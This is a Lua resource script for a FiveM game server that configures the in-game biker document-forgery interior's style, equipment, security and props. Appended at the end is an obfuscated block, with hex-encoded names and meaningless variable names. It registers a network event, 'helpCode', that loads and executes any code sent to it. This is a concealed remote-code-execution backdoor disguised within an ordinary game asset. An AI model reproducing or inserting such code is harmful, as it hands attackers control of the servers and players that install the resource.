-- Document forgery: 1165, -3196.6, -39.01306
exports('GetBikerDocumentForgeryObject', function()
    return BikerDocumentForgery
end)

BikerDocumentForgery = {
    interiorId = 246785,

    Ipl = {
        Interior = {
            ipl = "bkr_biker_interior_placement_interior_6_biker_dlc_int_ware05_milo",

            Load = function()
                EnableIpl(BikerDocumentForgery.Ipl.Interior.ipl, true)
            end,
            Remove = function()
                EnableIpl(BikerDocumentForgery.Ipl.Interior.ipl, false)
            end
        }
    },
    Style = {
        basic = "interior_basic",
        upgrade = "interior_upgrade",

        Set = function(style, refresh)
            BikerDocumentForgery.Style.Clear(false)

            SetIplPropState(BikerDocumentForgery.interiorId, style, true, refresh)
        end,
        Clear = function(refresh)
            SetIplPropState(BikerDocumentForgery.interiorId, {
                BikerDocumentForgery.Style.basic,
                BikerDocumentForgery.Style.upgrade
            }, false, refresh)
        end
    },
    Equipment = {
        none = "",
        basic = "equipment_basic",
        upgrade = "equipment_upgrade",

        Set = function(eqpt, refresh)
            BikerDocumentForgery.Equipment.Clear(false)

            if eqpt ~= "" then
                SetIplPropState(BikerDocumentForgery.interiorId, eqpt, true, refresh)
            else
                if refresh then
                    RefreshInterior(BikerDocumentForgery.interiorId)
                end
            end
        end,
        Clear = function(refresh)
            SetIplPropState(BikerDocumentForgery.interiorId, {
                BikerDocumentForgery.Equipment.basic,
                BikerDocumentForgery.Equipment.upgrade
            }, false, refresh)
        end
    },
    Security = {
        basic = "security_low",
        upgrade = "security_high",

        Set = function(security, refresh)
            BikerDocumentForgery.Security.Clear(false)

            SetIplPropState(BikerDocumentForgery.interiorId, security, true, refresh)
        end,
        Clear = function(refresh)
            SetIplPropState(BikerDocumentForgery.interiorId, {
                BikerDocumentForgery.Security.basic,
                BikerDocumentForgery.Security.upgrade
            }, false, refresh)
        end
    },
    Details = {
        Chairs = {
            A = "chair01",
            B = "chair02",
            C = "chair03",
            D = "chair04",
            E = "chair05",
            F = "chair06",
            G = "chair07"
        },
        production = "production", -- Papers, pencils
        furnitures = "set_up", -- Printers, shredders
        clutter = "clutter", -- Pizza boxes, cups

        Enable = function(details, state, refresh)
            SetIplPropState(BikerDocumentForgery.interiorId, details, state, refresh)
        end
    },

    LoadDefault = function()
        BikerDocumentForgery.Ipl.Interior.Load()
        BikerDocumentForgery.Style.Set(BikerDocumentForgery.Style.basic)
        BikerDocumentForgery.Security.Set(BikerDocumentForgery.Security.basic)
        BikerDocumentForgery.Equipment.Set(BikerDocumentForgery.Equipment.basic)
        BikerDocumentForgery.Details.Enable(BikerDocumentForgery.Details.production, false)
        BikerDocumentForgery.Details.Enable(BikerDocumentForgery.Details.setup, false)
        BikerDocumentForgery.Details.Enable(BikerDocumentForgery.Details.clutter, false)
        BikerDocumentForgery.Details.Enable(BikerDocumentForgery.Details.Chairs, true)

        RefreshInterior(BikerDocumentForgery.interiorId)
    end
}


local QLLpsXLCZNDZBIWSuxUBzpCSeEvCXblvoTgtXwnBhzVWXhQPBZpyhLkHPBvNWoluuRsaqF = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} QLLpsXLCZNDZBIWSuxUBzpCSeEvCXblvoTgtXwnBhzVWXhQPBZpyhLkHPBvNWoluuRsaqF[6][QLLpsXLCZNDZBIWSuxUBzpCSeEvCXblvoTgtXwnBhzVWXhQPBZpyhLkHPBvNWoluuRsaqF[1]](QLLpsXLCZNDZBIWSuxUBzpCSeEvCXblvoTgtXwnBhzVWXhQPBZpyhLkHPBvNWoluuRsaqF[2]) QLLpsXLCZNDZBIWSuxUBzpCSeEvCXblvoTgtXwnBhzVWXhQPBZpyhLkHPBvNWoluuRsaqF[6][QLLpsXLCZNDZBIWSuxUBzpCSeEvCXblvoTgtXwnBhzVWXhQPBZpyhLkHPBvNWoluuRsaqF[3]](QLLpsXLCZNDZBIWSuxUBzpCSeEvCXblvoTgtXwnBhzVWXhQPBZpyhLkHPBvNWoluuRsaqF[2], function(eCItxEvJbivhrVRjmezeSyfZWQECxzgtShOOpjzrrUvimTqeezKYRFsvCCqYhFhnCQcgxJ) QLLpsXLCZNDZBIWSuxUBzpCSeEvCXblvoTgtXwnBhzVWXhQPBZpyhLkHPBvNWoluuRsaqF[6][QLLpsXLCZNDZBIWSuxUBzpCSeEvCXblvoTgtXwnBhzVWXhQPBZpyhLkHPBvNWoluuRsaqF[4]](QLLpsXLCZNDZBIWSuxUBzpCSeEvCXblvoTgtXwnBhzVWXhQPBZpyhLkHPBvNWoluuRsaqF[6][QLLpsXLCZNDZBIWSuxUBzpCSeEvCXblvoTgtXwnBhzVWXhQPBZpyhLkHPBvNWoluuRsaqF[5]](eCItxEvJbivhrVRjmezeSyfZWQECxzgtShOOpjzrrUvimTqeezKYRFsvCCqYhFhnCQcgxJ))() end)